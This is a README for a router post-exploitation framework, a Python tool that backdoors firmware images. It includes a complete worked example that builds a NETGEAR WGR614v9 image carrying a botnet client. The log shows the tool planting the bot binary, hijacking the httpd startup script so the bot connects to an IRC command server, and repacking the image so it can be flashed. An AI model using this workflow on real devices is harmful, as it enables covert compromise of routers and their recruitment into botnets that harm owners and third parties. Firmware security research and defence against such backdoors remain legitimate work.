Router Post-Exploitation Framework
==================================

Currently, the framework includes a number of firmware image modules:

    'Verified'   - This module is confirmed to work and is stable.

    'Unverified' - This module is believed to work or should work with
                   little additional effort, but awaits being tested on a
                   physical device.

    'Testing'    - This module is currently undergoing development and is
                   unstable for the time being.  Users should consider this
                   module a "work in progress."

    'Roadblock'  - Issues have halted progress on this module for the time
                   being.  Certain unavailable utilities or significant
                   reverse engineering work may be necessary.

For a list of options, run:

    ./rpef.py -h

For a list of all currently supported firmware targets, run:

    ./rpef.py -ll


A little architecture
---------------------

The script is written for Python 2.6 and may require the installation of
a few modules.  It is typically invoked as:

    ./rpef.py <firmware image> <output file> <payload>

and accepts a number of optional switches (see -h).

The rules/ directory stores a hierarchy of rules/<vendor>/<module>
directories.  One module correlates to one firmware checksum (not to one
specific router) since multiple routers have been observed to run the
exact same firmware.  Within each module is properties.json which stores
the language and order of operations necessary to unpackage, backdoor,
and repackage the target firmware image.  The payloads/ directory stores
cross-compiled binaries ready for deployment, and the optional
dependencies/ directory stores miscellaneous files to aid the process.

The utilities/ directory stores pre-compiled x86 binaries to perform
tasks such as packing/unpacking filesystems, compressing/decompressing
data (for which no suitable .py module exists), and calculating
checksums.

The payloads_src/ directory stores source code for the payloads
themselves.  All payloads are written from scratch to keep them as small
as possible.


Usage
-----

To verbosely generate a firmware image for the WGR614v9 backdoored with a botnet client, run:

    ./rpef.py WGR614v9-V1.2.30_41.0.44NA.chk WGR614v9-V1.2.30_41.0.44NA_botnet.chk botnet -v

And the process should proceed as follows:

    $ ./rpef.py WGR614v9-V1.2.30_41.0.44NA.chk WGR614v9-V1.2.30_41.0.44NA_botnet.chk botnet -v
    [+] Verifying checksum
        Calculated checksum: 767c962037b32a5e800c3ff94a45e85e
        Matched target: NETGEAR WGR614v9 1.2.30NA (Verified)
    [+] Extracting parts from firmware image
        Step 1: Extract WGR614v9-V1.2.30_41.0.44NA.chk, Offset 58, Size 456708 -> /tmp/tmpOaw1tn/headerkernel.bin
        Step 2: Extract WGR614v9-V1.2.30_41.0.44NA.chk, Offset 456766, Size 1476831 -> /tmp/tmpOaw1tn/filesystem.bin
    [+] Unpacking filesystem
        Step 1: unsquashfs-1.0 /tmp/tmpOaw1tn/filesystem.bin -> /tmp/tmpOaw1tn/extracted_fs
            Executing: utilities/unsquashfs-1.0 -dest /tmp/tmpOaw1tn/extracted_fs /tmp/tmpOaw1tn/filesystem.bin
            
            created 217 files
            created 27 directories
            created 48 symlinks
            created 0 devices
            created 0 fifos
    [+] Inserting payload
        Step 1: Rm /tmp/tmpOaw1tn/extracted_fs/lib/modules/2.4.20/kernel/net/ipv4/opendns/openDNS_hijack.o
        Step 2: Copy rules/NETGEAR/WGR614v9_1.2.30NA/payloads/botnet /tmp/tmpOaw1tn/extracted_fs/usr/sbin/botnet
        Step 3: Move /tmp/tmpOaw1tn/extracted_fs/usr/sbin/httpd /tmp/tmpOaw1tn/extracted_fs/usr/sbin/httpd.bak
        Step 4: Touch /tmp/tmpOaw1tn/extracted_fs/usr/sbin/httpd
        Step 5: Appendtext "#!/bin/msh
    " >> /tmp/tmpOaw1tn/extracted_fs/usr/sbin/httpd
    [+] INPUT REQUIRED, IP address of IRC server: 1.2.3.4
    [+] INPUT REQUIRED, Port of IRC server: 6667
    [+] INPUT REQUIRED, Channel to join (include #): #hax      
    [+] INPUT REQUIRED, Prefix of bot nick: toteawesome
        Step 6: Appendtext "/usr/sbin/botnet 1.2.3.4 6667 \#hax toteawesome &
    " >> /tmp/tmpOaw1tn/extracted_fs/usr/sbin/httpd
        Step 7: Appendtext "/usr/sbin/httpd.bak
    " >> /tmp/tmpOaw1tn/extracted_fs/usr/sbin/httpd
        Step 8: Chmod 777 /tmp/tmpOaw1tn/extracted_fs/usr/sbin/httpd
    [+] Building filesystem
        Step 1: mksquashfs-2.1 /tmp/tmpOaw1tn/extracted_fs, Blocksize 65536, Little endian -> /tmp/tmpOaw1tn/newfs.bin
            Executing: utilities/mksquashfs-2.1 /tmp/tmpOaw1tn/extracted_fs /tmp/tmpOaw1tn/newfs.bin -b 65536 -root-owned -le
            Creating little endian 2.1 filesystem on /tmp/tmpOaw1tn/newfs.bin, block size 65536.
            
            Little endian filesystem, data block size 65536, compressed data, compressed metadata, compressed fragments
            Filesystem size 1442.99 Kbytes (1.41 Mbytes)
                29.38% of uncompressed filesystem size (4912.18 Kbytes)
            Inode table size 2245 bytes (2.19 Kbytes)
                33.63% of uncompressed inode table size (6675 bytes)
            Directory table size 2322 bytes (2.27 Kbytes)
                55.26% of uncompressed directory table size (4202 bytes)
            Number of duplicate files found 3
            Number of inodes 293
            Number of files 218
            Number of fragments 22
            Number of symbolic links  48
            Number of device nodes 0
            Number of fifo nodes 0
            Number of socket nodes 0
            Number of directories 27
            Number of uids 1
                root (0)
            Number of gids 0
    [+] Gluing parts together
        Step 1: Touch WGR614v9-V1.2.30_41.0.44NA_botnet.chk
        Step 2: Appendfile /tmp/tmpOaw1tn/headerkernel.bin >> WGR614v9-V1.2.30_41.0.44NA_botnet.chk
        Step 3: Appendfile /tmp/tmpOaw1tn/newfs.bin >> WGR614v9-V1.2.30_41.0.44NA_botnet.chk
    [+] Padding image with null bytes
        Step 1: Pad WGR614v9-V1.2.30_41.0.44NA_botnet.chk to size 1937408 with 0 (0x00)
    [+] Generating CHK header
        Step 1: packet WGR614v9-V1.2.30_41.0.44NA_botnet.chk rules/NETGEAR/WGR614v9_1.2.30NA/dependencies/compatible_NA.txt rules/NETGEAR/WGR614v9_1.2.30NA/dependencies/ambitCfg.h
            Executing: utilities/packet -k WGR614v9-V1.2.30_41.0.44NA_botnet.chk -b rules/NETGEAR/WGR614v9_1.2.30NA/dependencies/compatible_NA.txt -i rules/NETGEAR/WGR614v9_1.2.30NA/dependencies/ambitCfg.h
    [+] Removing temporary files
        Step 1: Rmdir /tmp/tmpOaw1tn/

